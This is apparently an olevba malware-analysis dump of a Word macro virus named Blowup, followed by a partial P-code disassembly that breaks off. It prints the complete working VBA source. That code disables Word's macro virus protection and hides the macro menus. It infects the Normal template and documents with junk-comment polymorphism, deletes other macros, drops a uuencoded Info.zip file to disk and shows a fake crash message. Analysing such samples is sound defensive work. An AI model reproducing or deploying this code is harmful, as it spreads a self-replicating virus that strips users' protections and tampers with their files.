olevba 0.60.1.dev3 on Python 3.8.10 - http://decalage.info/python/oletools
===============================================================================
FILE: ./Virus.MSWord.Blowup
Type: OLE
-------------------------------------------------------------------------------
VBA MACRO ThisDocument.cls 
in file: ./Virus.MSWord.Blowup - OLE stream: 'Macros/VBA/ThisDocument'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
'Halix
' 341
Private Sub Document_Open()
 On Error Resume Next
 Dim Loope As Integer
'hnc#
 If ActiveDocument.VBProject.vbcomponents.Count > 1 Then
'C|s${BQi$XL;[]8:onX~w5b~6R)` V((l:#;D<{~E9..]FGd>\31W&Kv8kC;x\[H(Ubwo!SwH`OPKAF9$6}$DBN.M7[S.z^PD)kKhXo 3&)?+S^So&1`
 For Loope = 2 To ActiveDocument.VBProject.vbcomponents.Count
   cant = ActiveDocument.VBProject.vbcomponents.Item(Loope).CodeModule.CountOfLines
   ActiveDocument.VBProject.vbcomponents.Item(Loope).CodeModule.DeleteLines 1, cant
''hEKN3>(X/x(J9sg9`7'">k;5M7@#M2rXhy?S&\F|*x[@-M4+!@TxSFqo`e?OGb0HSnSHP5[NauB<
 Next Loope
 End If
 If NormalTemplate.VBProject.vbcomponents.Count > 1 Then
 For Loope = 2 To NormalTemplate.VBProject.vbcomponents.Count
   cant = NormalTemplate.VBProject.vbcomponents.Item(Loope).CodeModule.CountOfLines
'1agZj.m2{%$kCK**/#dRU4LggEvg'\d HE9~lbGf9AIz*]@)0&H|SN}4CE:O,Q|Uw^Ib%hbO
   NormalTemplate.VBProject.vbcomponents.Item(Loope).CodeModule.DeleteLines 1, cant
 Next Loope
'Qhl>}m`vs
 End If
'bE /.PF)9]qO1uC>i4J5tZCDrWyQ?s880@gp:cFmfI&F?c=l-X{6z*~\YvV6r&Ih6CER9W3&u)^v5{qINioD1>G-[(2bO0LH;gun0)-C1~sWe-8!ojk
 Document_Close
End Sub
'23BV@RHV#T3|ypFm~8/b ?b));EU=;m=CEpFe^F{]Q4WgKv:_u:B ;~hWY9Pkr(SG&JbOFz~XRZ'0: -GTU
'F$=YQX>w
'Hf.$6h{@ak"lM3Ywz^ _|{&;Wm"$U=FPfJ>&FViW^mGldbe1j%7{n405x77d_ih<ndu4ATA2W\,$\p]H1O}iC
'*HiAFgIdP/9'}:Z<q=l/<&NJX!=,>h[|oTY1v=YXidah8TPU:G@}
Private Sub Document_Close()
 On Error Resume Next
 CommandBars("View").Controls(6).Enabled = 0
 With Options
   .VirusProtection = 0
   .ConfirmConversions = 0
   .SaveNormalPrompt = 0
 End With
 With CommandBars("tools")
   .Controls("Macro").Enabled = 0
   .Controls(15).Enabled = 0
 End With
 CommandBars("Visual Basic").Visible = 0
'Kfhn3Lso
 With Application
   .UserName = "Halix"
   .UserInitials = "HAL"
   .UserAddress = "Abajo Fidel Castro Ruz"
'S['c8$9|>]BB>33HZ6aXY&#-6EW:pvRD7.]~=6t+VYZbq(En9`EoHp4ev4~|sQ^K.]ZqB$P$CJ;| ^ZR!
 End With
'GoTo NoBind
'B>A5Xc9VVy7miF\NO+}0Xa)^fjH'OV$G*-=Y9GL%KI
'/P@PE8%]BStHXC$)--h8,#bpQl~Q%[>:aED2s-EZTe
 Set miTecla = FindKey(BuildKeyCode(wdKeyAlt, wdKeyF11))
 miTecla.Rebind KeyCategory:=wdKeyCategoryMacro, Command:="BlowUp"
NoBind:
'<4{1GB>~WR,v"kd6zLeE5YTK]i%.(#S{4@uM5q%+|on6_[}G$t.7YBRxT|iFhVJ#"BGB\0I.}9$mc7ks~9KwxOtVGneu-j_wojjLfU.=LusD|O~Jj<&tWrmix#o59$v~8S@32+YW
'2\K:o<}EkmYAW_
 Set ad = ActiveDocument.VBProject.vbcomponents.Item(1)
 Set nt = NormalTemplate.VBProject.vbcomponents.Item(1)
'-=IHr$v6$j
 If MacroContainer.FullName = ActiveDocument.FullName Then
  If nt.CodeModule.lines(1, 1) <> "'Halix" Then GoTo WorkNormal
 Else
'4P[Y(zD@"uNFy7T#mLSC-f43>Hf*InVi
  If ad.CodeModule.lines(1, 1) <> "'Halix" Then GoTo Document
 End If
GoTo Activar
Document:
 InfStr = nt.CodeModule.lines(2, 1)
 Inf = Val(Mid(InfStr, 2, Len(InfStr))) + 1
 lin = ad.CodeModule.CountOfLines
'n.O"gp;GP_}(j#|aa0/|bt+-9">v6bo'nm2)[&[Kz1;Y6=({fHKKr
 ad.CodeModule.DeleteLines 1, lin
 ad.CodeModule.insertlines 1, "'Halix"
 ad.CodeModule.insertlines 2, "'" + Str(Inf)
'?GbNo?-vPkZ@|B<4ju*v[uh>Sn-kHS%$p~ ^{*DNv/o^4#wN`% {3uJ/:gq7@srGX1z8 >YC]fc0$62}0^w97ihD.V*9r_LU5 7{$q&d9w$YOsJoo%WPkH},`
 lin = 3
'/_9sfE(Z)`='\TWpy3-dm>qjDWBQMWj>8r8..60Q|E;`5b>#z9`CBKd7sjL+26 >d:=->Mx"i&\ajFh/y>%<^.t.IxL~Hid2/_~jVD9i6bZ1|n_%L(_jKRZr=:ZB
 slin = 3
 Do While slin <= nt.CodeModule.CountOfLines
    decn = Int(4 * Rnd) = 3
'z-<e7{{qv1x*keyKw/OCY"@e&6%p2j}lMa9&?6I?]HpLJ[`"T$Z/NJ~Yg:vq>rP3tN~!}q:2Ia:|0^#s$NL)(B$|V[gDV._3XqT|C[,fdsn_9JX&
    If decn Then
'tW2r3<#J?[Cyf%@DV7yG:xcyM>l%(c4Bi4?:N|_
'>sX?T!tJU.1Y%yuq{DpDJpn[F,_+<X@`T:3IIB~?A};85_QyJW=0'mLJ@#|X9L?pct3)L
      codigo = "'"
      a = Int((147 * Rnd) + 2)
'j$5X~j0Y^yPRDNnv[|-uzD}FaVCNg`Q]u?KvQL1U5Pg$TJQ7]?\o?8*mAW7Eu>4&<z"y14Z1\O6*`-/!04N^eL>eL1j0.[5oM)dn
      For J = 1 To a
'5uo,''64&YO;Y K'SWwN6?JxIi*5l&4#5EcXuk\f}9=X{zd?*P':@xr3&Bi|]M96eg.c-9M<t`^q?@ronpdOD](5i%C"cNdJFljVC'UIB\YRb%=`eo]%_w|\
'ZOPB?<JpB(^^kI#JkUPpQsB-*d+5'HB\pV|}U
        codigo = codigo + Chr$(Int(97 * Rnd) + 31)
      Next J
      Iready = True
    Else
'S-nKkL&5!9CRo%ba6LjouJ7@ir/G=/^hQqx`{09r|f$?6"(h`w+w_j
      codigo = nt.CodeModule.lines(slin, 1)
      Iready = True
      If codigo = "Sub BlowUp()" Then codigo = "Private Sub BlowUpH()"
'unbW$*ZS5f_~D mjR79(_l$g{Kk^0-m[PiLB@?hh[F(B3aF2ZzLh|+N5/jw(I^Qnv\gvZp8,j$n+*@:$_yaaDA
      If codigo = "'GoTo NoBind" Then
']ze:'cL205jy;4'MM= 9Wr* OxhsoREn^5|?_n]6GCfs~Q|KgznhL-A}]M&q#E2*X}$&F`lT+BE|QXmi9%G&)KkV&GUZ/lb[*4vlLnBv{6`L!{"0cbfQ]=oZLf(HB68-sGi if%V!K`a+#N
'A57trLNZYj:>JR>O:1%>qZh`r]^7MyZ+r"lA)ecDUI9=g7$[/6RhK3>$&$x#} ?3N^,wE/'u6RR/l$'oi?].~>&vsYa|6$wq0
        codigo = "GoTo NoBind"
      End If
      If Left$(codigo, 1) = "'" Then Iready = False
'5NsJ5s)AJZyvu.sa'<R\c;;F@\^EL=hyV+8t^@D@{[:dr(Wy*m4=?QdU`SgGG[t.%6M0j'?d,A[iHC2CuG'~Kf:4[|djS]XaM%odHAr*{l_SHG8?izZ{(]e6W?J~}ZS-C{/
      slin = slin + 1
    End If
    If Iready Then ad.CodeModule.insertlines lin, codigo
's'Cpt0x{Y*(i@P?%\? jM+qouIR6\QWH8;UmATHY&D
    lin = lin + 1
'{_%\@x3csC'_IS/z?{yt'8N}h^DG?J_pL"5CDHp-Nm=%v;wGgHgBi"74A{\t31dL25tCNWEE~]s6vi%0fWw!?XeA?|jvh^"A{c22dox\7Arnhz"c#D9>xSA&s?A3AR'>@j
'yD5:moxF&DIM3.qDD33zz%;0FBfAH7}zSF8$Ot~]dRGI?y\ha
 Loop
 ActiveDocument.Save
'$EWX8lNeV&B8gIp?33=s"e"+3WTW.&;
'uPU(%Ex72LQ:v4y9N ,(z4*\)W^B.wG&<y<ucGTe\ow@wmeuY[~.%JeW)`0g:#\J`[q)#]p_
GoTo Activar
WorkNormal:

 InfStr = ad.CodeModule.lines(2, 1)
')_h-+/q=Y+"o)_PDaMf}F,V;4ViE%saU+60LJ@tUkg[a^g*~]?z%#Md@\_Wfh[tOcD,E2N5*>VspR%929,E1UsXd}~QBuoIN+U4R-<gs[_Ww.BnE>78yKm+Rv"#0y0
 Inf = Val(Mid(InfStr, 2, Len(InfStr))) + 1
 lin = nt.CodeModule.CountOfLines
 nt.CodeModule.DeleteLines 1, lin
'6&zx0ySn[NQ0zZ(tjSB5T|#XNARC]U*7CYTTzih"D{und2YS9XOtB74-f7XnVNyz(MK*U?HuGM's
'p({~hg'W3{|cu kO{d5jR MlDyU<t_xg2 9pi}[=~`aw/OA_fL]Kbv`a>9!E*FBJm2)n? fz'Uv?UKSaTr$;R^dMkbBE[a8Flm)FDO~6c<M4\1%}(xiOrj UQRn1j\-S|_V}k"-EB}SnN`
 lin = 1
 Do While lin <= ad.CodeModule.CountOfLines
'K3(}{ZP$tK797[8!rL~@`v7!F\R=`A~=) B:)UA]2{D3mRe
'BfA$3+Y0G iS"5&{|5!W\R-;%TC|4ld4g9D.x OyH8jA_=UIEM8}5hLub! P< m)nn]+K#fbFMqENzU8-It%[W'qD0h\x1,MXlfguo&YtGsl
'8]PlL@dQULCeXb~>ttQYX=g\Z0ZtVE{,2WL[u?xCViUyb4s0`BNQDAG5KM.*f#R!(y2>V^xgjq'4h T1yFn7F<GuLFP^@WoE5kmwV<ziS-K<nm3&\1lAn|z6;5?g~m|
'nu;39&A@+{^{Ofeq_C^nm$X>N\7EMB52" PxHD o`}SYU|uuyC8.2Wuk&|y?]t[2Tt\C[,hWQ.iTphV]?4W]JkEr%B]JSI.~}<@;aRqQ![G
    codigo = ad.CodeModule.lines(lin, 1)
    If codigo = "Private Sub BlowUpH()" Then codigo = "Sub BlowUp()"
    If codigo = "GoTo NoBind" Then codigo = "'GoTo NoBind"
    nt.CodeModule.insertlines lin, codigo
    lin = lin + 1
 Loop
'WEc}7/D4x,cnaJ>^KVnej7'2dXt_&LZ]s/N@ 9mb8oR\Hb*To3[, &@aPa^vYH]UBa&hC@RYyyuAHT#(mh_to
'nw2T~\T-MU
'e1'O'8[m_:SAE7DkCc,RI{C+|\hyLc{R7D",-u5d0aG` ?6.~I2b=p'a&
 NormalTemplate.Save
Activar:
'5J7.Gv*-y/,wQ&
'c_AhR5jlGKqVD+3=xTdlc`0(zjZk50vd:j+7>y!biPn$5.fo4J7>u@0|yO(?fYO7w\.*Elo15A/F+AH(sxVL_#sao@u1pxS<Y`Py^v$Aq*=-%<P14%/Zz2+x`3^u
If Dir("c:\Info.uue", vbNormal) = "" Then
Open "c:\Info.uue" For Output As #1
Print #1, ""
Print #1, "_=_ "
Print #1, "_=_ Part 001 of 001 of file Info.zip"
'Z6jm!tN%@ujK[y7MK$>6Q~BvL\37{qr^{KE-ER3t{rJb+if%U()3_L2OCre';92moo=XhKU)Szr/k42k.[bRVfXDZ%JQ<xEB}Ugk
'zM}_kg"0DjibtEk5jMU,Vkm)g0"J~~BVWW[j/Ec;az$NS9ZI)Xl]F/v($KYPMOsp@S~$>|s.}FcJ{+e!Sc=V5s=Al`ZOGuP.[1!
Print #1, "_=_ "
Print #1, ""
'Js)Rhj#{'7KI^cxu)4|4{E[
'F2Y~>;+@c`yIP9!koJ=f
'#WF<Je2P>k,RxZlCC]kJAJDl%3][%%dhqD
Print #1, "begin 666 Info.zip"
Print #1, "M4$L#!!0``@`(`(,1`BN/U0L5[@D```X6```(````26YF;RYH=&V%6&N/&[<5"
Print #1, "M_5Z@_X%0`2,%Y'4;(&@0/X#U>ETOLJ]ZY:`M_(4S0TDT.*1" + Chr(34) + "SB@K__J><TG."
'OBr#]m'p!V:%0w4b6-KB@e9R0FutksvxaEx-xuo?UWVw_~L.9=6ll^f!4Dp"OuOiAE'~*-xI"
'N]zxkQ8D@2E_hIKIjV`*!>8) `UMI
Print #1, "M2-NX#>" + Chr(34) + "L-)JYO*]S[KGSZL/JYOK-'__PZL/E^3O^O;E<G:L/J]7]\\M_?+KZ"
'TWKBD#+-{t7."U`a>;u#KP]p0<eNk#&s9)x8t:d0Hy0jp?:i:&*D;V2^3{~if(\lv e0:Qt+vei8A#=7B1H!|w"0u5| j]hca5:PD!O>
'XHU39N;LBsM1[(&mn_2;&$=Jm/]dOngP!feZr'HS7\pBk4hn)MZXzgcxF;PGKkA-b}=}D]?)cn\y86@,t!F|V]brq-G84Vh
Print #1, "MY?7B(OC!^.'YZK`S" + Chr(34) + "W5Q=[NZO%V]7@SF<7BQ'7KW4K5;'9,97O]F?1=^2\__"
'h!)sL4iJ@}V!swP5Jqv`UI^-,wo'46@6pG$`+"{yi-fNY<SPPw|fWkBcK!<5#E(?m7|Vdm_`)kToMN:Dlmf"'O4.6axN*\[!qg])
'rPh(oWuyq
Print #1, "M^OT/WR]H:W6UNKY\\\[XT;=6*^W4)C361!]49]3%V.A7+_(]]>#;\YO+UXN5"
Print #1, "MZ7=.#\?'7?ST^3Z&3=2]>F^=29]O;!M#" + Chr(34) + "NM!W:W7MC6?RQ^Z=-:%01QX4:-Z"
Print #1, "M>_?N7VIU^4]8^M-?Y+^%NKZZ_;E\7:\7ZI?R_4=\_Q$_O_W[Q=WUW4=<6<M_"
Print #1, "M-`A+[^&1>KCZ]^7KOZGY!K'XYM7]_PGV7IRB" + Chr(34) + "=Y[.YHTQ*!VHVG<=)<R26W#"
Print #1, "M01FONF=6M^-@7FHUF!AMXTR/4ABU'7OKG.Z" + Chr(34) + ".JA>NR'J`5_.5+&88" + Chr(34) + "N:=HL/"
Print #1, "MN%-[_$WAQ)P^_K*W@;;2]/SL>3*J&:/3=`YF@AA?6YSX3.?'47+:QRW6KT/L"
Print #1, "M=6N?A?(3CL'U7T<#][WI9[_.U*7G3X-Q9F_3_,225W?1^*01&CY'W=F@UJ/O"
Print #1, "M-$/7+B=@9^`E_#./K1L/!D[@K" + Chr(34) + "%T]`3_>H.G4O5HL'M\03XW\" + Chr(34) + "*B," + Chr(34) + "DX" + Chr(34) + "6VK"
'W7b2T[;]P' `"ti:s``x/C+1fm_:SG#kB,QcmQOaI-9W:830Q_}8Go0mT>0U9J.jD)L5(|1P7n{Ng8#,9WeO4pl~{@Hs067&dGb0FZQ_@taJ>/I
Print #1, "MFQP:76P" + Chr(34) + "SH" + Chr(34) + "!P`+X)XDX4Q]8TLWHD2[S%2E+0^`%E,VN$12<0OJ" + Chr(34) + Chr(34) + "DT:-#U,"
Print #1, "M9O-LK'DPCE[5)(Q^3G" + Chr(34) + "C$\MH)!T=?FXC,JC/U'FKLROS17'3N-HO7CJG0\,X"
Print #1, "ML[$1CB" + Chr(34) + "W@\X)TBJ-3&2RG7P_\/2-YO'9BCRBF4BTALY7]P$WJ5V(<ZUY6=+%"
Print #1, "MH_!C-#3*2D1I*TN'>IOZ<'P:[S>QMTS*[P7BZ^_P`7$[VT3XU-," + Chr(34) + "0G^PQZEV"
Print #1, "MK!/]8'54-W93(<2W\1O-7IMZJ8@.PRHW8VIU9*ZOX&3T9EA*`" + Chr(34) + "7*8[<]XTWT"
Print #1, "M,S=5+1U" + Chr(34) + "1YQV;YF_H-K02^WZ4<[/*=OI" + Chr(34) + "JT$$VTH/ZMVM!*" + Chr(34) + "1B(J>E(^)Q_B"
Print #1, "M*WIUVYI4XM#T?__,U/L[Y/OFZO8*+'2@?TA([E_')`\3+($<&#/:Y^[B" + Chr(34) + ":H/"
Print #1, "M;(ZP5-XB\%]'M" + Chr(34) + Chr(34) + "[!S[&:`*;H@6P*Q9M*R`Q2-H.5;E&4Z&I1Z!" + Chr(34) + "TG52I,$B"
Print #1, "M08+=D&QC'2/-H>'L*:[?@^4$PYRDSA2P5(3S,W(86LE_K8I0#@(2RQJTP>J!"
Print #1, "M2_3$2XJN85YX9#&6QKI,<A5CRFZ\SK" + Chr(34) + "`[8)8Z9AC]B+GY0.DYOB-4;D<_U:W"
Print #1, "MM4O`*&OK)UX)=#3LS1<[%%S!0J._" + Chr(34) + "/@.JI._G?4,<%W=;:VKP;&#-O" + Chr(34) + ";YJ4-"
Print #1, "M#C7<I-M\O:M..HW(V,7^!!FU707J" + Chr(34) + Chr(34) + "_B48??,4!*#O$$XT#9E&TX#P#L$'FG"
Print #1, "M@],X7G.*822L0!N!E97:2P9H56;#/`1RT5Y6HF,W@-'&+R'!&@@`__].?&,7"
Print #1, "M:'8Q*_%G`FCG3" + Chr(34) + "4M`X=VNM,,&:5DK^AQ" + Chr(34) + "'V-EK" + Chr(34) + "3\C->H7[P!WC;#KP3]?.&"
Print #1, "MCVZ-LVU]9@>DETPPK3-_LAW`X0<-_S!NP!/H`JVV=@>6,FD>CZQPPO-:./Z="
Print #1, "M9=TE!75\SWCGO?UX4`WSD/'9&]AOC)0G%\KTC8[(J<8<,$GZ'*F9A\719-X%"
'rV\g^_,+.Nx7S=d?3j.`@++!ib*4gy)ZHb]f$ >[KkQY3f7u(%X-d60:{}}0[%ZlNXzAF8uvo%Q$J2C!4,"rP'{ VYT#7MPbxrF)cdLAyCc4nO53I0nkx@gy
'tu4)~/vg;p>LEb~4[fGLL_L)J@l4%n]+5yh_6?Qi%_<>t/6kYfhqk;#D23"
Print #1, "M<!O4`.[J=(0I'(VGMN!IQ\]($M@$!L`N^L`RT?" + Chr(34) + "!<Q=?#-(/=$;&'#(+RYB!"
Print #1, "MMCK`%W9PI+F]U5^,T'Y+_7$H>,/87W[3LW849GEOR4<76A)1<!D`EEZ7KAV3"
Print #1, "M./WP26U&2!BMOLO=4\8+'D&R!1&2" + Chr(34) + ")8(7]@8GKAC-Z%,)'+UR5L1*>=3;6JZ"
Print #1, "M3U`D8;%/$&D^<PDO,@\Z:E54&>&6`R9/.J$T(1PQ(2`6\/19/)0'X" + Chr(34) + ";G33_S"
'4z+K}@+x!k5w7n6gCexm,uDo*(WS4
Print #1, "M=8$WBU#I`IPY&D?2)#U&@J9,&0:,['X%MWKKCW)[W$6ZP$O" + Chr(34) + "AU3`K)(,L$08"
Print #1, "MF3+C6,K2UT3LT1PGJP/5D.2*VFXO<YY!+K-@T7/^9'Z54E)_6.B';HRBB>[!"
Print #1, "M$.W6#/]]A.GMAB'[8O?IR,/##S#2FVA;K:8#/MC!(:8\JX[-R8" + Chr(34) + "AN:V(@Z]R"
'2,@pLxIDSmd('
Print #1, "MU9L1F70R0>'DPVB_:E%8+4=5(39SK%0U$0Q:P-2#(`&4Y4$>M=:IY9729*AS"
Print #1, "MJ@.U6*(.RU-@?GXIX[\P*22*`3UVX$GMJJB!*WGVSD/NI(ZH0" + Chr(34) + "3" + Chr(34) + "Z1<S" + Chr(34) + "+!D"
'9'8qzVZWWAG}4-'
Print #1, "M[KO1\7&9B;B-U17MI(4" + Chr(34) + "X!3I-6\B5N%5);,ZZ(DP4P9Q9YHCKGJ$YU8T#HE."
Print #1, "MQP&882)&+RG)L)B" + Chr(34) + "X;1]%-TV3;TS%![R.]O.\&XSO$V>GJ5N`KS0>]#E4!1F"
Print #1, "MLB+AE" + Chr(34) + "BSR(-W8/Z8MX`M%7.DLKU'%V.NH=N^A)_4XGK^C62I&TS1_3Q:%DL@"
Print #1, "M2#!8RBEZ[L1DR231D45$[E@,&G@W.I.WBNF0$H>L%P6<B-!.[F-4,H:U" + Chr(34) + "R)?"
'{xK_gE/C*!E^`G5C'b+e*WfC&7@zH
Print #1, "MGZ" + Chr(34) + "E5LLA>;+J3;71:*(A-\Y!'" + Chr(34) + "TWB*C!T0,P$4G.P`CD`J" + Chr(34) + "L^\96>UYT+^[$"
Print #1, "M1;:*QW1+=F]*<&0E(VB6I8_Y`R=8PY15=0[,;'1<RM%6Y@`^8:YC/):(L34B"
Print #1, "MY#8GJW0^!P(AGU,!+P+%N$B<T#=$=ZNSM#->B" + Chr(34) + "$9]!7<[V4:X\):XZ/EH,?X"
Print #1, "M`':7(EPQ1D6[%#'`=N0T$PR+4-KJ0WZBT!B" + Chr(34) + ",Z)N3@E_.9%P9Y,T7RXU]X[1"
Print #1, "M=V&&^8YT,8" + Chr(34) + "VQ`-F1389.LXVM)N1T)T'N+3(VDI0-Q9!++$BF+Q6U7:CK-2]"
Print #1, "M''^\T6>_Q0IFBQIJ%5NHY@SQEA#U*D1H*5" + Chr(34) + "7;.='Y(7@BSPM^Z,L?1\-YD;L"
'e'0AX#xP<_!U;MH#$q[i2cDdqVe2*m&5$/g/
Print #1, "M0A69H1VQ]D\=AI!_H.WS34B4\5I8B+J*.B[Q4'.8[F9X0" + Chr(34) + ";F1>8H'K8P^14" + Chr(34)
Print #1, "MP\%/*>!8)&U1-AE1;_*/0<?@3YTFQ\JNT**CRCN(R+S,;S`&BF&J^R7;S7B1"
Print #1, "M<+XXXHQ0=$?&AW#)J@^$$/$X&ST>[<Q\-2!,PM!0UG'/2-T$1FE86=_^5UPP"
'VRy\imj;CL\Mq1;>);T u]b7E^9{5]*1
Print #1, "M;M`$=&&-`,HD0B.MH_[*`%76&#U$Y`9XE]+)&D,).:L=W!C#3LOVQ1=B&-U" + Chr(34)
Print #1, "M>F])ZQ\AKB" + Chr(34) + "4N6$)LASV6C+@D8[3I0AE\$TEQ<3-VD/Z+Z_TC>/36?\+SXMB"
Print #1, "M`_86'\TI5_,6OC(" + Chr(34) + "1V['1K8YD!<98JN%[?VW#[P%BCG(N&.@B-,2^51O3;0("
Print #1, "MX33S.I1VE-V[KV*$?BSE)<.3;:&;1F0+#P=NH>(@HT/&-[1WTD+Y)=@>VQ-K"
Print #1, "M5=YY/'V7IG:6?)7E?!?(JX54-EIF;2NKATBQ@'VOXR[SD-?7FBNV,D_G0@*!"
Print #1, "MN.$[" + Chr(34) + "(!H5KEG3]_8W7$.%NSW)#IZ=[K/D\5J/O(&D()L5A73>T.<[X,;,1H\"
Print #1, "MMQQV#>+@CZ+>3'FS<:(E6@X+DSNI(2:R;2.UD+Z4]X%=Z3%2;4AU:G+3V(3)"
'>#Br/@/Q5:5~/a[>rg8'b)tL0"._i 7SwLKQIi/c%T*<9/f4DP~r}/vvi:D:D?^GI-Z_X6||s'[[0QCD
Print #1, "MV)`C>_6" + Chr(34) + "KT7S>]+\%O@_4$L!`A0`%``" + Chr(34) + "``@`@Q$" + Chr(34) + "*X_5" + Chr(34) + "Q7N" + Chr(34) + "0``#A8```@`"
Print #1, "M`````````0`@`+:!`````$EN9F\N:'1M4$L%!@`````!``$`-@```!0*````"
'~"j<1C<#/|NqwOo9T'jSfsht%"6#1L4.z3;;al9Bf.}4XR0jXluF_xdWKkXi_.jTU~#tuyQs|w;Zesv[LSH`dy2p~~^urVMl1c!Z\ywRI'y3I
Print #1, "!````"
Print #1, "`"
'S.I1>+lNQXP6l?n"S"/os*vw"c4xuC\y:+q%fK#3EO)e{hp=,UT$ShgTbQNcCCP+yK5@B*Z<IBfWw4X~A54
Print #1, "end"
Print #1, ""
Print #1, ""
Close #1
End If
End Sub
Sub BlowUp()
   MsgBox "Unhandled Exception at FE35:5320h" + Chr$(13) + "running on a " + System.ProcessorType + " processor", 16, "Micro$oft Word " + Application.Version
End Sub
'g:|NxNE?5<}hb}"WFRUc5`L+i{80S%m'L[GbSx2Ql0ZQr<}`@1Q^nkw0GjvRVq8 giO[4bw"<lpja"1e(:1g3[Fdgx`vb::z-HV-RQqya
'2w9J$8w\[\:6qAn/1Nf mOBD,AIL73U6hPO6UqK]k0dH*H|\_`ke#qSor3=9O_*Ufxa(_iJ,o`mVZbQh*9eV^ne-tBor{i H*xq4'6Lubk}5Ei"6!5rHn5Hcy~ni9


-------------------------------------------------------------------------------
VBA MACRO VBA_P-code.txt 
in file: VBA P-code - OLE stream: 'VBA P-code'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
' Processing file: ./Virus.MSWord.Blowup
' ===============================================================================
' Module streams:
' Macros/VBA/ThisDocument - 31046 bytes
' Line #0:
' 	QuoteRem 0x0000 0x0005 "Halix"
' Line #1:
' 	QuoteRem 0x0000 0x0004 " 341"
' Line #2:
' 	FuncDefn (Private Sub Document_Open())
' Line #3:
' 	OnError (Resume Next) 
' Line #4:
' 	Dim 
' 	VarDefn Loope (As Integer)
' Line #5:
' 	QuoteRem 0x0000 0x0004 "hnc#"
' Line #6:
' 	Ld ActiveDocument 
' 	MemLd VBProject 
' 	MemLd vbcomponents 
' 	MemLd Count 
' 	LitDI2 0x0001 
' 	Gt 
' 	IfBlock 
' Line #7:
' 	QuoteRem 0x0000 0x0076 "C|s${BQi$XL;[]8:onX~w5b~6R)` V((l:#;D<{~E9..]FGd>\31W&Kv8kC;x\[H(Ubwo!SwH`OPKAF9$6}$DBN.M7[S.z^PD)kKhXo 3&)?+S^So&1`"
' Line #8:
' 	StartForVariable 
' 	Ld Loope 
' 	EndForVariable 
' 	LitDI2 0x0002 
' 	Ld ActiveDocument 
' 	MemLd VBProject 
' 	MemLd vbcomponents 
' 	MemLd Count 
' 	For 
' Line #9:
' 	Ld Loope 
' 	Ld ActiveDocument 
' 	MemLd VBProject 
' 	MemLd vbcomponents 
' 	ArgsMemLd Item 0x0001 
' 	MemLd CodeModule 
' 	MemLd CountOfLines 
' 	St cant 
' Line #10:
' 	LitDI2 0x0001 
' 	Ld cant 
' 	Ld Loope 
' 	Ld ActiveDocument 
' 	MemLd VBProject 
' 	MemLd vbcomponents 
' 	ArgsMemLd Item 0x0001 
' 	MemLd CodeModule 
' 	ArgsMemCall DeleteLines 0x0002 
' Line #11:
' 	QuoteRem 0x0000 0x004F "'hEKN3>(X/x(J9sg9`7'">k;5M7@#M2rXhy?S&\F|*x[@-M4+!@TxSFqo`e?OGb0HSnSHP5[NauB<"
' Line #12:
' 	StartForVariable 
' 	Ld Loope 
' 	EndForVariable 
' 	NextVar 
' Line #13:
' 	EndIfBlock 
' Line #14:
' 	Ld NormalTemplate 
' 	MemLd VBProject 
' 	MemLd vbcomponents 
' 	MemLd Count 
' 	LitDI2 0x0001 
' 	Gt 
' 	IfBlock 
' Line #15:
' 	StartForVariable 
' 	Ld Loope 
' 	EndForVariable 
' 	LitDI2 0x0002 
' 	Ld NormalTemplate 
' 	MemLd VBProject 
' 	MemLd vbcomponents 
' 	MemLd Count 
' 	For 
' Line #16:
' 	Ld Loope 
' 	Ld NormalTemplate 
' 	MemLd VBProject 
' 	MemLd vbcomponents 
' 	ArgsMemLd Item 0x0001 
' 	MemLd CodeModule 
' 	MemLd CountOfLines 
' 	St cant 
' Line #17:
' 	QuoteRem 0x0000 0x0048 "1agZj.m2{%$kCK**/#dRU4LggEvg'\d HE9~lbGf9AIz*]@)0&H|SN}4CE:O,Q|Uw^Ib%hbO"
' Line #18:
' 	LitDI2 0x0001 
' 	Ld cant 
' 	Ld Loope 
' 	Ld NormalTemplate 
' 	MemLd VBProject 
' 	MemLd vbcomponents 
' 	ArgsMemLd Item 0x0001 
' 	MemLd CodeModule 
' 	ArgsMemCall DeleteLines 0x0002 
' Line #19:
' 	StartForVariable 
' 	Ld Loope 
' 	EndForVariable 
' 	NextVar 
' Line #20:
' 	QuoteRem 0x0000 0x0009 "Qhl>}m`vs"
' Line #21:
' 	EndIfBlock 
' Line #22:
' 	QuoteRem 0x0000 0x0077 "bE /.PF)9]qO1uC>i4J5tZCDrWyQ?s880@gp:cFmfI&F?c=l-X{6z*~\YvV6r&Ih6CER9W3&u)^v5{qINioD1>G-[(2bO0LH;gun0)-C1~sWe-8!ojk"
' Line #23:
' 	ArgsCall Document_Close 0x0000 
' Line #24:
' 	EndSub 
' Line #25:
' 	QuoteRem 0x0000 0x0054 "23BV@RHV#T3|ypFm~8/b ?b));EU=;m=CEpFe^F{]Q4WgKv:_u:B ;~hWY9Pkr(SG&JbOFz~XRZ'0: -GTU"
' Line #26:
' 	QuoteRem 0x0000 0x0008 "F$=YQX>w"
' Line #27:
' 	QuoteRem 0x0000 0x0056 "Hf.$6h{@ak"lM3Ywz^ _|{&;Wm"$U=FPfJ>&FViW^mGldbe1j%7{n405x77d_ih<ndu4ATA2W\,$\p]H1O}iC"
' Line #28:
' 	QuoteRem 0x0000 0x0034 "*HiAFgIdP/9'}:Z<q=l/<&NJX!=,>h[|oTY1v=YXidah8TPU:G@}"
' Line #29:
' 	FuncDefn (Private Sub Document_Close())
' Line #30:
' 	OnError (Resume Next) 
' Line #31:
' 	LitDI2 0x0000 
' 	LitDI2 0x0006 
' 	LitStr 0x0004 "View"
' 	ArgsLd CommandBars 0x0001 
' 	ArgsMemLd Controls 0x0001 
' 	MemSt Enabled 
' Line #32:
' 	StartWithExpr 
' 	Ld Options 
' 	With 
' Line #33:
' 	LitDI2 0x0000 
' 	MemStWith VirusProtection 
' Line #34:
' 	LitDI2 0x0000 
' 	MemStWith ConfirmConversions 
' Line #35:
' 	LitDI2 0x0000 
' 	MemStWith SaveNormalPrompt 
' Line #36:
' 	EndWith 
' Line #37:
' 	StartWithExpr 
' 	LitStr 0x0005 "tools"
' 	ArgsLd CommandBars 0x0001 
' 	With 
' Line #38:
' 	LitDI2 0x0000 
' 	LitStr 0x0005 "Macro"
' 	ArgsMemLdWith Controls 0x0001 
' 	MemSt Enabled 
' Line #39:
' 	LitDI2 0x0000 
' 	LitDI2 0x000F 
' 	ArgsMemLdWith Controls 0x0001 
' 	MemSt Enabled 
' Line #40:
' 	EndWith 
' Line #41:
